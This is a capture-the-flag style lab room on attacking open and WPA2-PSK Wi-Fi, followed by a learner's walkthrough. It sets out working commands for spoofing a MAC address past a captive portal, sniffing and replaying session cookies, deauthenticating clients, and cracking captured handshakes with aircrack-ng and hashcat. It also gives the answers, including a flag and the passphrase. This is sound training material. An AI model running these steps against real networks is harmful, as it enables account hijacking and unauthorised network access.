# Attacking Open and WPA2-PSK Networks
## Bypass a captive portal, then capture, crack and decrypt a WPA2 handshake.

## Task 1: Introduction 

The Wi-Fi Fundamentals and Reconnaissance room covered observation, producing a description of an entire wireless environment without connecting to any of it. That description confers no access. This room converts it into access.  

Two configurations are addressed, being the two most frequently encountered in practice. An open network requires no password and applies no encryption, so every frame crosses the radio in cleartext and is readable by any receiver in range. WPA2-PSK does encrypt that traffic, but the scheme rests on one passphrase shared by every client, and the four-way handshake proving a client knows it can be captured and attacked offline. Recovering that passphrase exposes the traffic of every device on the network, not only the attacker's own.  

Two access points from the reconnaissance scan are in scope, each identified below by its BSSID (Basic Service Set Identifier), the hardware address of the access point's radio and the value every tool in this room is pointed at. Guest-WiFi (F0:9F:C2:71:22:10) is an open network on channel 6 behind a captive portal. Home-2G (F0:9F:C2:71:22:12) is WPA2-PSK, also on channel 6, with an unknown passphrase. The objective is access to both and a flag from each. The two are worked in parallel because the WPA2 attack differs from the open one by exactly one step.  

### Learning Objectives
- Bypass a captive portal on an open network by spoofing the MAC address of an already-authorised client.  
- Explain WPA2-PSK and the role of the four-way handshake in proving a client knows the passphrase.  
- Capture a WPA2 four-way handshake by deauthenticating a connected client.  
- Crack a captured handshake against a wordlist to recover the passphrase.  
- Connect to the network with the recovered passphrase and retrieve a flag from behind it.  
- Decrypt captured WPA2 traffic to steal a victim's live session cookie.  

### Prerequisites 

Completion of the Wi-Fi Fundamentals and Reconnaissance room, which is where monitor mode and airodump-ng are introduced and practised. Both are treated here as established tools rather than taught a second time.  

### Machine Access

Start the lab by clicking the Start Machine button below. The machine takes a couple of minutes to boot and then appears in Split View in your browser. For convenience, you can use the expand button in the bottom-left corner of Split View to open the VM in full-screen mode. No login is required, as the session opens directly onto the desktop, already authenticated as the user account.  

### Confirming the Wireless Interfaces

Open a Terminal on the machine and confirm that the wireless interfaces are present:  

```console
user@debian-thm:~$ sudo iw dev
```

Several wlan interfaces are listed, numbered from wlan0 upward. These are the radios used to observe the networks in the lab and to attack them. Most of the tooling requires root privileges, so commands are prefixed with sudo; the password, where prompted, is user

The attacks in this room run from a card in monitor mode, so create the monitor interface before you begin:  

```console
user@debian-thm:~$ sudo airmon-ng check kill
user@debian-thm:~$ sudo airmon-ng start wlan0
```

airmon-ng check kill is not optional here, and it matters for more than the monitor interface.  NetworkManager manages every wireless radio on the machine, so when it is left running it will reclaim the managed radio moments after wpa_supplicant associates with a network. The association appears to succeed,  wpa_supplicant reports no error, and then  iw dev wlan1 link reads Not connected and every  DHCPDISCOVER goes unanswered. Stopping it first avoids that, and it has to come first because the command also stops any  wpa_supplicant already running.
That gives you wlan0mon, the interface every capture and injection command in this room expects. The two managed radios stay as they are, wlan2 for the open network and wlan1 for the WPA2 one once its passphrase is known, because a card in monitor mode cannot associate with anything.  

### Answer the questions below   

**Deploy the machine and read through the introduction, then continue to the next task when you are ready.** 
_No answer needed_

## Task 2: Bypassing the Captive Portal 

An open network issues no key, so joining one takes nothing more than asking. What stands between a new client and the rest of the network is the venue's captive portal, and the decision it records is made per client, against an identifier that client announces. Reaching what sits behind it therefore means joining as an ordinary client, confirming the traffic is being held back, then presenting the identity of a client the portal has already admitted.  

The target is the access point the reconnaissance scan in the [previous room](https://tryhackme.com/room/wififundamentalsandrecon) flagged OPN in its ENC column, Guest-WiFi on channel 6 at BSSID F0:9F:C2:71:22:10. It is the network in the lab requiring the least effort.  

**What Open Means**  

The term open describes the authentication, but its consequence concerns encryption. An access point configured for open authentication performs no key exchange, so nothing transmitted afterwards is protected. Every frame travels in cleartext and is readable by any receiver within range in monitor mode. There is no handshake to capture and nothing to crack, because no secret was established.  

OWE (Opportunistic Wireless Encryption) is the alternative, which the previous room's 5 GHz sweep showed on FreeConnect as AUTH OWE. Joining it looks no different from joining this one, and yet a capture of it yields nothing readable, for a reason the Attacking WPA3 and Rogue Access Points room introduces and the Attacking OWE and the 6 GHz Band room works through (both coming soon). Guest-WiFi is plain OPN, so the techniques below apply in full.  

**Captive Portals**  

A captive portal is an authentication step a venue requires before forwarding client traffic onward. Guest-WiFi runs one served by openNDS. It gates access but provides no encryption, so traffic before, during and after the portal remains as readable as on any other open network. This task defeats the portal; the next exploits the absence of encryption.

**Joining Guest-WiFi**

The monitor interface is wlan0mon. A second managed-mode radio, wlan2, serves as an ordinary client. Because the network is open, the only significant configuration line is key_mgmt=NONE. Write the following to guest-open.conf. 

```console
network={
    ssid="Guest-WiFi"
    key_mgmt=NONE
}
```

Bring the association up and request an address:  

```console
user@debian-thm:~$ sudo wpa_supplicant -B -i wlan2 -c guest-open.conf
Successfully initialized wpa_supplicant
user@debian-thm:~$ sudo dhclient wlan2
```

wpa_supplicant drives the association with the same -B, -i and -c flags introduced in the previous room. Association is a layer 2 event and provides no IP address, so dhclient follows to request one from the access point by DHCP (Dynamic Host Configuration Protocol).

A single iw command achieves the same result without a configuration file:  

```console
user@debian-thm:~$ sudo iw dev wlan2 connect Guest-WiFi
```

Once DHCP replies, the interface holds an address on the guest subnet, with the access point acting as gateway on 192.168.10.1:  

```console
user@debian-thm:~$ ip addr show wlan2
9: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.10.84/24 brd 192.168.10.255 scope global wlan2
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:200/64 scope link 
       valid_lft forever preferred_lft forever
```

**The Portal Response, HTTP 511**

openNDS intercepts port 80 traffic from every MAC address absent from its allow-list. Addressing the request to an IP rather than a hostname keeps name resolution out of the test:  

```console
user@debian-thm:~$ curl -sI http://192.168.10.1/
HTTP/1.1 511 Network Authentication Required
Content-Length: 1289
Connection: close
Content-Type: text/html; charset=utf-8
Date: Sat, 04 Jul 2026 14:41:22 GMT
```

-sI combines two options. -I asks for the response headers alone rather than the page body, which is all that is needed to see how the gateway answers an unauthenticated client, and -s keeps the progress meter out of the output.  
HTTP 511 Network Authentication Required, defined in [RFC 6585](https://www.rfc-editor.org/info/rfc6585/), indicates the client is on the network but has not authenticated. No header names the software, but the splash page returned in the body signs itself openNDS S/N:f09fc2712210, identifying the daemon. Every request receives the same response until openNDS considers the client authorized.  

**Bypassing the Portal by Spoofing a MAC Address**

The mechanism determining authorization is the weakness. Once a client accepts the terms, openNDS adds it to an allow-list keyed on the client's MAC address (Media Access Control). A MAC address is not a secret. It is transmitted in the clear in every frame the client sends, and on an open network those frames have been readable throughout.  

The reconnaissance scan listed three clients on Guest-WiFi, and the same rows come from airodump-ng pinned to channel 6 and filtered to F0:9F:C2:71:22:10, which leaves only the stations associated with that access point:  

```console
user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 wlan0mon
...
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
 F0:9F:C2:71:22:10  80:18:44:BF:72:47  -41   0 - 1e     0      24
 F0:9F:C2:71:22:10  B0:72:BF:B0:78:48  -44   0 - 1      0      12
 F0:9F:C2:71:22:10  B0:72:BF:44:B0:49  -47   0 - 1      0       8
```

Clone the first of those addresses onto wlan2. macchanger rewrites the address a card presents to the network, with -m supplying the one to adopt. The driver accepts the change only while the interface is down, so it is taken down first and brought back up once the new address is in place:  

```console
user@debian-thm:~$ sudo ip link set wlan2 down
user@debian-thm:~$ sudo macchanger -m 80:18:44:BF:72:47 wlan2
Current MAC:   02:00:00:00:02:00 (unknown)
Permanent MAC: 02:00:00:00:02:00 (unknown)
New MAC:       80:18:44:bf:72:47 (unknown)
user@debian-thm:~$ sudo ip link set wlan2 up
```

Reconnect by rerunning wpa_supplicant and dhclient, then issue the identical request. The same URL that returned 511 now returns a redirect to the panel's login page:  

```console
user@debian-thm:~$ curl -sI http://192.168.10.1/
HTTP/1.1 302 Found
Date: Sat, 04 Jul 2026 14:43:07 GMT
Server: Apache/2.4.66 (Debian)
Set-Cookie: PHPSESSID=REDACTED; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php
Content-Type: text/html; charset=UTF-8
```

<img width="2124" height="918" alt="image" src="https://github.com/user-attachments/assets/57a02755-212f-4387-b52b-d05156f09b8a" />

**Answer the question below**
*What HTTP status code does the openNDS captive portal return to a client that has not yet authenticated?*

**Answer:** 511

## Task 3: Stealing a Session on an Open Network 

Network access alone is of limited value, and the substantive risk on an open network requires no spoofing at all. A web application does not recognise a returning user by their password on every request. It recognises a session cookie, a token issued at login and sent back by the browser with everything that follows. 

An open network applies no encryption, so that cookie crosses the air as readable text along with everything else. The requests legitimate users of Guest-WiFi send to the router panel can therefore be lifted out of a capture by anyone within range of the access point.

**Capturing the Cookies**  

Pin the monitor interface to the network's channel and write to disk:  

```console
user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 -w opn wlan0mon
```

The channel lock, BSSID filter and -w prefix behave as they did in the reconnaissance room, holding the radio on Guest-WiFi so it is never listening elsewhere when the guest clients transmit, and writing what it hears to opn-01.cap  

Leave the capture running while the guest clients are active, then stop it with Ctrl+C. A protected network would need a decryption step at this point. An open one establishes no key at all, so the frames in opn-01.cap are plaintext exactly as they were received.  

tshark is the command-line form of Wireshark and reads a capture straight off disk. -r names the file. -Y http.cookie applies a display filter, keeping only the packets carrying a cookie header. -T fields drops the packet summaries in favour of bare values, and each -e names one field to print, ip.src for the address that sent the request and http.cookie for the cookie it carried:  

```console
user@debian-thm:~$ sudo tshark -r opn-01.cap -Y http.cookie -T fields -e ip.src -e http.cookie
192.168.10.100	PHPSESSID=REDACTED-1
192.168.10.101	PHPSESSID=REDACTED-2
192.168.10.102	PHPSESSID=REDACTED-3
192.168.10.102	PHPSESSID=REDACTED-3
192.168.10.100	PHPSESSID=REDACTED-1
192.168.10.101	PHPSESSID=REDACTED-2
192.168.10.102	PHPSESSID=REDACTED-3
```

Three sessions belonging to two users, free1 and free2, are logged into the panel on 192.168.10.1, and their cookies have been recovered in plaintext. Each row is one captured request, so a client that made seven requests contributes seven identical rows and the output is longer than the number of distinct sessions in it. Sorting the first column, or reading the second for repeats, reduces it to the three values that matter. Captured values will differ from the example. No key and no cracking were required.  

<img width="2206" height="886" alt="image" src="https://github.com/user-attachments/assets/134a4901-3fe5-4dd2-b8aa-da722ffa784b" />

**Reusing a Stolen Session**  

```console
user@debian-thm:~$ curl -s -b "PHPSESSID=REDACTED-1" http://192.168.10.1/index.php
```

```console
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Router Configuration</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
...
Welcome free1<br><br>Flag: <button onclick="copyFlagToClipboard('THM{REDACTED}')">THM{REDACTED}</button><br><br><br><br>Congratulation! You have logged into password protected page. 
<a href="logout.php">Click here</a> to Logout.
```

The flag is obtained without knowledge of any password, from a session another user disclosed over the air.  

The panel also exposes a login form at login.php, and the default admin/admin credentials are accepted. The result differs:  

```console
user@debian-thm:~$ curl -s -c admin.txt -d "Username=admin&Password=admin&Submit=Submit" http://192.168.10.1/login.php -o /dev/null
user@debian-thm:~$ curl -s -b admin.txt http://192.168.10.1/index.php
    <title>WiFi Router Configuration</title>
...
Welcome admin<br><br>No FLAG, try logging in with another user ;)  <a href="logout.php">Click here</a> to Logout.
```

The flag is scoped to the ordinary users rather than the administrator. The weakness demonstrated is not a guessable administrative password. It is that an open network permits an attacker to become a legitimate user by taking their session from the air, and no login page defends against a credential the attacker never enters.  

The tasks that follow address WPA2-PSK, against which the same attack succeeds but requires one additional step.  

One piece of cleanup remains, held back until now because the replay above depended on the spoofed address. openNDS authorises by MAC, so the stolen session only worked while wlan2 still wore the borrowed one, and restoring it earlier would have locked the panel again. With the looting done, restore the card. wlan2 is one of the radios later used to broadcast rogue access points, and such an access point usually adopts whatever MAC its interface carries, so a spoof left in place would give that AP a borrowed BSSID and silently empty any capture filtered on the expected one:  

```console
user@debian-thm:~$ sudo ip link set wlan2 down
user@debian-thm:~$ sudo macchanger -p wlan2
user@debian-thm:~$ sudo ip link set wlan2 up
```

**Answer the questions below**  

**What is the flag from the open network?**  

The first thing we're gonna do is list the available wireless adapters and their associated info.  

<img width="1876" height="764" alt="image" src="https://github.com/user-attachments/assets/efa1ecf7-8a0a-4ccb-9263-001b0a0089dc" />

Then we run sudo airmon-ng check kill to stop all processes that might interfere with monitor mode.

<img width="1172" height="583" alt="image" src="https://github.com/user-attachments/assets/5927390d-7c31-4ae1-a8e2-d42dbb41a161" />

We start capturing traffic with 

```console
sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 -w opn wlan0mon  
```

We let it run for roughly a minute before quitting the process with Ctrl-C

<img width="1832" height="650" alt="image" src="https://github.com/user-attachments/assets/72f5ac0f-e78b-4081-ab68-3c1cc8f1d9cc" />

Verify that our capture file exists, then we run  

```console
sudo tshark -r opn-01.cap -Y http.cookie -T fields -e ip.src -e http.cookie  
```

to parse its content  

<img width="2119" height="1058" alt="image" src="https://github.com/user-attachments/assets/2f0e2947-072a-48c6-80a9-196a37772e90" />

Although the output contains 29 lines, there are only three distinct sessions  
The cookies were transmitted over HTTP without encryption  

Randomize MAC address:  

<img width="1400" height="374" alt="image" src="https://github.com/user-attachments/assets/affde7d2-3920-40bc-a6fe-8b040ed13624" />

Verify the captive portal has been bypassed using curl:  

<img width="1292" height="536" alt="image" src="https://github.com/user-attachments/assets/49b038a9-4de9-4052-8f20-1095c8d5a094" />

It's time to finally retrieve the flag using our existing cookie  

```console
curl -s -b "PHPSESSID=87da1cf5bf60433283679b12459d97af" http://192.168.10.1/index.php
``` 

<img width="2908" height="563" alt="image" src="https://github.com/user-attachments/assets/6dc8ab25-ef91-4e66-b29e-fc6c7e3c3dd9" />

**Answer: THM{559bcac8fcb676576af3de81b40a5ef7190db4bd}**

## Task 4: How WPA2-PSK works  

WPA2-PSK encrypts traffic in transit, so the attack against it is not a brute-force assault on that encryption. It targets one specific moment in the protocol, the exchange in which a client proves to the access point that it knows the passphrase.  

### One Key for the Whole Network

The PSK in WPA2-PSK stands for Pre-Shared Key, also called WPA2-Personal. A single passphrase protects the network and every device shares it. This is the opposite of the enterprise networks observed on channel 44, where each user authenticates individually against a backend server. Personal mode exchanges that separation for convenience, and in doing so creates the weakness exploited here: recovering one secret compromises the entire network.  

The passphrase is never used directly as a key. WPA2 stretches it using PBKDF2 (Password-Based Key Derivation Function 2), a deliberately slow key-derivation function, taking the passphrase and using the network name, or SSID, as its salt and running 4096 rounds of hashing to produce a 256-bit Pairwise Master Key (PMK).  

Two properties matter. The derivation is deterministic, so the same passphrase and SSID always produce the same PMK, which is what permits guessing. And because the SSID is the salt, the same passphrase on a differently named network derives a different PMK, which is why precomputed tables must be built per-SSID and why cracking tools require the network name.  

<img width="1077" height="353" alt="image" src="https://github.com/user-attachments/assets/4b1e964a-0da3-401d-b6fb-aa11987367bc" />

**The Four-Way Handshake**

Client and access point must agree on encryption keys without transmitting the passphrase or the PMK. The four-way handshake does this, proving both parties hold the same PMK and deriving session keys unique to that connection.  

A nonce is a random number used once, and the two exchanged here are named for their senders, the ANonce from the access point and the SNonce from the client. Both feed the derivation of the Pairwise Transient Key (PTK), which protects one client's own traffic. The Group Temporal Key (GTK) is generated by the access point alone and handed to the client under the protection of the PTK, and it protects the broadcast and multicast frames every client must read. Later messages also carry a Message Integrity Code (MIC), a short signature over the frame.  

<img width="2499" height="683" alt="image" src="https://github.com/user-attachments/assets/d4e01e9a-b507-47f3-b0a2-f1934a82820b" />

The client combines the PMK with both nonces and both MAC addresses to derive the PTK, then signs message 2 with a MIC computed from it. The MIC can only exist if the client holds the PMK, so it proves possession without the passphrase being transmitted. The nonces and MAC addresses, by contrast, travel in cleartext, and that combination is what the attack exploits.    

<img width="2214" height="943" alt="image" src="https://github.com/user-attachments/assets/adfa1fbe-d080-4952-8f10-3e6d818c0aa2" />

**Why Capturing the Handshake Is Enough**

Everything except the binding secret crosses the air in the clear. An attacker holding a captured handshake can test each candidate offline: run the candidate and the SSID through PBKDF2 for a trial PMK, derive the trial PTK from the captured nonces and MAC addresses, compute the resulting MIC and compare it against the captured one. A match identifies the passphrase.    

This is an offline dictionary attack. The network is never contacted again, so no lockout is triggered, no counter increments and no rate limit applies. The security of a WPA2-PSK network therefore reduces to whether the passphrase survives guessing.  

A second route exists. Some access points include a PMKID (Pairwise Master Key Identifier) in the first handshake message, derived from the PMK and the two MAC addresses. It is attackable by the same process and can be obtained from a single frame without waiting for a client, making it a clientless alternative where no clients are present.  

**Forcing a Handshake**

A handshake occurs only when a client joins. If every device is already connected and idle, none is about to join, so a connected one is forced off the network instead and reconnects by itself.  

The eviction uses the unauthenticated deauthentication frame described in the reconnaissance room, spoofed to appear to come from the access point. The client drops, reconnects within moments, and performs a new four-way handshake in front of the listening radio.  

**Answer the questions below**

*The key derived from the passphrase and the SSID using PBKDF2 has a three-letter abbreviation. What is it?* 
**Answer:** PMK

## Task 5: Capturing the Handshake  

A four-way handshake is only of use once it exists as a file on disk. It crosses the air at the single moment a client joins, so capturing one needs a radio already listening on the right channel when that moment arrives, and a client persuaded to join at a time of the attacker's choosing rather than its own.

The target is Home-2G, WPA2-PSK on channel 6 at BSSID F0:9F:C2:71:22:12.

**Locking the Capture Onto the Target**  

A hopping card is listening elsewhere for most of every second, and the four handshake frames pass in a fraction of it, so pin airodump-ng to the channel and filter to the single access point:  

```console
user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:12 -w home2g wlan0mon
```

The flags are the ones aimed at Guest-WiFi in Task 3, pointed at Home-2G here. Leave the window running for the remainder of the task.  


```console
 CH  6 ][ Elapsed: 24 s ][ 2026-07-04 15:10

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:12  -28   0      241       58    1   6   54   WPA2 CCMP   PSK  Home-2G

 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes

 F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -38   0 - 6e     0      72
 F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -41   0 - 6      0      35
```

The single row in the upper table is the access point itself, with WPA2 under ENC and PSK under AUTH. The lower table is the station list, carrying one row for every client airodump-ng has heard exchanging frames with that access point, and here it holds two, 28:6C:07:6F:F9:43 and 28:6C:07:6F:F9:44. The Frames column counts what has been received from each, so a count that climbs while the capture runs marks a station that is actively transmitting rather than one heard only once.  

Either will serve as a target. Waiting for one to reconnect of its own accord would produce a handshake eventually, but offers no control over timing, so the reconnection is provoked instead.  

**Forcing a Reconnect With aireplay-ng**

aireplay-ng is the injection tool of the aircrack-ng suite, and it forges the deauthentication frame described in Task 4. Leave airodump-ng running and open a second terminal:   

-0 selects the deauthentication attack, and the 6 following it is the number of bursts. -a identifies the access point and -c targets one specific station. Targeting a named client disturbs only that device, which is quieter and more reliable than the broadcast deauthentication sent when -c is omitted.  

```console
15:10:42  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:12) on channel 6
15:10:42  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
15:10:43  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
15:10:43  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
15:10:44  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
15:10:44  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
15:10:45  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:43] [ 0| 0 ACKs]
```

The ACKs count is not the success signal here. The simulated radios never report acknowledgements back, so the count remains at zero on every burst while the deauthentication still reaches its target and the client still reconnects. Success is confirmed instead by airodump-ng displaying WPA handshake: in its header and adding an EAPOL note to the targeted station. EAPOL, Extensible Authentication Protocol over LAN, is the frame type the four handshake messages travel in, so that note marks a station whose handshake frames have reached the capture.  

**Confirming the Handshake**

Return to the airodump-ng window:  

```console
 CH  6 ][ Elapsed: 48 s ][ 2026-07-04 15:10 ][ WPA handshake: F0:9F:C2:71:22:12

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:12  -28   0      412      131    3   6   54   WPA2 CCMP   PSK  Home-2G

 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes

 F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -38   0 - 6e     0     118  EAPOL
 F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -41   0 - 6      0      35
```

WPA handshake: F0:9F:C2:71:22:12 in the header confirms a complete handshake for that BSSID, and the targeted client's row has gained an EAPOL note. If the header does not show it, run the aireplay-ng burst again.  

<img width="2171" height="843" alt="image" src="https://github.com/user-attachments/assets/74b6a17b-44a4-47bf-9dcb-d613488cd98d" />

Stop the capture with Ctrl+C. The file required is home2g-01.cap.  

**Answer the questions below**  

**Which aireplay-ng attack-mode number sends deauthentication frames?**  
*Answer:* 0

**What short phrase does airodump-ng display in the top-right of its header once the handshake has been captured?**  
*Answer:* WPA handshake

## Task 6: Cracking the Handshake  

home2g-01.cap contains a complete four-way handshake, but not the passphrase. Nowhere in the four EAPOL frames is the passphrase present. What the handshake provides is a means of testing a guess.  

Recovering the passphrase from that capture is therefore a search rather than a decode, and it runs entirely on the attacker's own hardware. Two variables decide the outcome, being whether the passphrase appears among the candidates tried and how quickly the hardware works through them. The two tools below run the same search and differ only in the file format they read and the hardware they drive.  

**The Handshake Verifies, It Does Not Store**  

The MIC signing message 2 is a one-way fingerprint and cannot be reversed, so recovery means running the comparison from Task 4 against every line of a wordlist until one candidate reproduces it.  

<img width="2206" height="928" alt="image" src="https://github.com/user-attachments/assets/dd77130a-b463-4d14-9000-3c818fb04778" />

This is why a partial handshake is useless: the cracking tool requires the nonces, the MAC addresses and at least one signed frame. The attack is entirely offline, so there is no lockout and nothing to detect, and it is embarrassingly parallel, which is why GPUs outperform CPUs at it. It cannot recover a passphrase that is never tried.  

**The Role of the Wordlist**  

<img width="2497" height="672" alt="image" src="https://github.com/user-attachments/assets/012e5c9f-748b-4762-9236-79d23ea04c13" />

**Cracking on the CPU With aircrack-ng**  

aircrack-ng is the cracking component of the aircrack-ng suite, and it runs the comparison loop above against every line of a wordlist. It requires no conversion and reads the .cap directly, which makes it the shortest route for a modest wordlist on a CPU. -w supplies the wordlist whose lines are the candidates. -b selects which access point in the capture to attack by BSSID, which matters because a capture may hold handshakes for several networks. The capture file itself is the last argument:  

```console
user@debian-thm:~$ sudo aircrack-ng -w /home/user/wordlists/wifi-passwords.txt -b F0:9F:C2:71:22:12 home2g-01.cap
Reading packets, please wait...
Opening home2g-01.cap
Read 1778 packets.

1 potential targets

                               Aircrack-ng 1.7 rev d3127e74

      [00:00:01] 988/4808 keys tested (803.17 k/s)

      Time left: 4 seconds                                      20.55%

                          KEY FOUND! [ REDACTED ]


      Master Key     : 54 15 FB 44 AC 0F BA 70 8C 25 8D E7 7F A2 08 82
                       5F FC 06 0A 22 A6 F7 3D C3 47 2B 81 74 17 AD 06

      Transient Key  : 9E 3E AC 6D B4 D5 71 11 B3 4E 86 93 E7 70 62 8D
                       46 2E A1 F9 EF 77 84 41 99 A6 52 24 C1 58 6B 8E
                       00 1A 99 BE 2D AF 23 29 47 CD CD 23 9E A4 4B 0A
                       8F 06 A4 BC F3 C6 20 3D 86 92 1C 22 2D E1 6B D1

      EAPOL HMAC     : 4E 27 D9 5B 5E 43 82 B9 F9 A5 CC 8C 68 1D 24 07
```

The k/s figure is the guessing rate in keys per second, so 803.17 k/s is about eight hundred candidates a second, which is what a CPU manages against WPA2 because each guess pays the deliberately slow PBKDF2 cost, adequate against a few-thousand-word list but hopeless against rockyou.txt.  

**Cracking With hashcat**  

hashcat is a general-purpose password recovery tool built to drive its guessing on a GPU, though this lab machine has none, so here it runs on the CPU. It expects a hash file rather than a packet capture. hcxpcapngtool, from the hcxtools package, bridges the two by reading a capture, extracting the handshake fields a cracker needs and writing them in that hash format. -o names the file those are written to, and the capture to read is given last:  

```console
user@debian-thm:~$ sudo hcxpcapngtool -o home2g.22000 home2g-01.cap
hcxpcapngtool 7.1.0 reading from home2g-01.cap...

summary capture file
--------------------
file name................................: home2g-01.cap
version (pcap/cap).......................: 2.4 (very basic format without any additional information)
duration of the dump tool (seconds)......: 35
link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
packets inside...........................: 1778
ESSID (total unique).....................: 1
BEACON (total)...........................: 1
PROBERESPONSE (total)....................: 22
DEAUTHENTICATION (total).................: 1536
AUTHENTICATION (total)...................: 4
ASSOCIATIONREQUEST (PSK).................: 1
WPA encrypted............................: 208
EAPOL messages (total)...................: 4
EAPOL RSN messages.......................: 4
EAPOL M1 messages (total)................: 1
EAPOL M2 messages (total)................: 1
EAPOL M3 messages (total)................: 1
EAPOL M4 messages (total)................: 1
EAPOL pairs (total)......................: 2
EAPOL pairs (best).......................: 1
EAPOL pairs written to 22000 hash file...: 1 (RC checked)
EAPOL M32E2 (authorized - ANONCE from M3): 1
...
```

All four message types and one EAPOL pair confirm the handshake is intact. The ... stands for several advisory paragraphs the tool prints afterwards, which note that .cap is a limited format, that the radiotap header is absent and that the capture held a great many deauthentication frames. None of them prevents the hash being written, and the line that matters is the one reporting it was. -m declares which hash type hashcat is being handed, since the same file would otherwise be meaningless to it, and 22000 is the mode for WPA/WPA2, formally WPA-PBKDF2-PMKID+EAPOL. Older references mention mode 2500, which 22000 supersedes. The hash file and then the wordlist follow as the two positional arguments:  

```console
user@debian-thm:~$ hashcat -m 22000 home2g.22000 /home/user/wordlists/wifi-passwords.txt
user@debian-thm:~$ hashcat -m 22000 home2g.22000 --show
2535db255556981bfda5f70445239873:f09fc2712212:286c076ff943:Home-2G:REDACTED
```

hashcat records every hash it cracks in a potfile and will not crack the same hash twice, so the result is read back rather than taken from the run itself. --show looks the hash up in that potfile and prints the stored line. The line gives the Message Integrity Code from the captured handshake, followed by the BSSID, the client's MAC address, the network name and the passphrase. Both routes converge on the same passphrase for Home-2G.  

**Why This Passphrase Fell**  

PBKDF2 performed as designed, which is why the guessing rate is measured in thousands rather than billions per second. What failed was the choice of passphrase, a dictionary word with a digit appended, which is a pattern near the top of rockyou.txt. A long, random passphrase subjected to the same attack would not be found. A captured handshake is not a guaranteed compromise but a guaranteed offline guessing opportunity.  

**Answer the questions below**  

*What is the hashcat hash-mode number used to crack a WPA/WPA2 handshake?*  
*Answer:* 22000

*What is the recovered passphrase for the Home-2G network?*  
*Answer:* starwars1

## Task 7: Connecting to the Network  

A recovered passphrase is only a credential until something is done with it. Using it means associating as an ordinary client, which moves the attacker from outside the encryption boundary to inside it and onto the same subnet as every other device on the network. The wireless attack ends at that point and an ordinary internal one begins, against whatever the network exposes to the clients it trusts.  

What this network exposes is a router with a web panel. Reaching it takes an association, an address on the subnet and a scan to establish what is listening.  

Association requires a radio in managed mode, since a monitor interface only listens and cannot hold a client connection. wlan0mon is therefore left to its capture work and wlan1, a separate managed interface, carries the connection.  

**Building the Client Configuration**  

wpa_supplicant reads a configuration file rather than accepting a password on the command line. The wpa_passphrase helper writes one. It takes the network name and then the passphrase recovered in the previous task as its two arguments, and prints the finished network={ ... } block to the terminal, so the redirect is what saves it as home2g.conf:  

```console
user@debian-thm:~$ wpa_passphrase Home-2G <passphrase> > home2g.conf
```

```console
network={
	ssid="Home-2G"
	#psk="<passphrase>"
	psk=<64 hexadecimal characters>
}
```

The hex string is the point of the tool. Rather than storing plaintext, wpa_passphrase performs the PBKDF2 derivation from Task 4, hashing the passphrase with the SSID to produce the 256-bit PMK, and it is that key wpa_supplicant uses. The original passphrase is retained only as a comment.  

**Associating and Obtaining a Lease**  

wpa_supplicant runs the client half of the join here as it did against Guest-WiFi in Task 2, with the same -B, -i and -c flags. What differs is the work it does. There key_mgmt=NONE left it nothing to prove, while here it proves knowledge of the key sitting in home2g.conf by completing the four-way handshake.  

iw dev wlan1 link then reports what that interface is associated with, naming the access point, the network and the frequency in use, or printing Not connected if the association never completed.  

```console
user@debian-thm:~$ sudo wpa_supplicant -B -i wlan1 -c home2g.conf
Successfully initialized wpa_supplicant
user@debian-thm:~$ sudo iw dev wlan1 link
Connected to f0:9f:c2:71:22:12 (on wlan1)
	SSID: Home-2G
	freq: 2437
	RX: 1819 bytes (28 packets)
	TX: 642 bytes (6 packets)
	signal: -30 dBm
	rx bitrate: 1.0 MBit/s
	tx bitrate: 2.0 MBit/s

	bss flags:	short-slot-time
	dtim period:	2
	beacon int:	100
```

The reported frequency of 2437 MHz is channel 6, so the association is with the expected access point. Layer 2 is established, layer 3 is not, so dhclient requests a lease as it did on the guest network. The output records the whole exchange, from the broadcast discovery through the offer of 192.168.2.23 and the request for it to the final acknowledgement:  

```console
user@debian-thm:~$ sudo dhclient -v wlan1
...
Listening on LPF/wlan1/02:00:00:00:01:00
Sending on   LPF/wlan1/02:00:00:00:01:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 8
DHCPOFFER of 192.168.2.23 from 192.168.2.1
DHCPREQUEST for 192.168.2.23 on wlan1 to 255.255.255.255 port 67
DHCPACK of 192.168.2.23 from 192.168.2.1
bound to 192.168.2.23 -- renewal in 37222 seconds.
```

The interface holds 192.168.2.23, and both the offer and the acknowledgement came from 192.168.2.1, which on a router of this class is the DHCP server, the gateway and the access point.  

**Mapping the Subnet**  

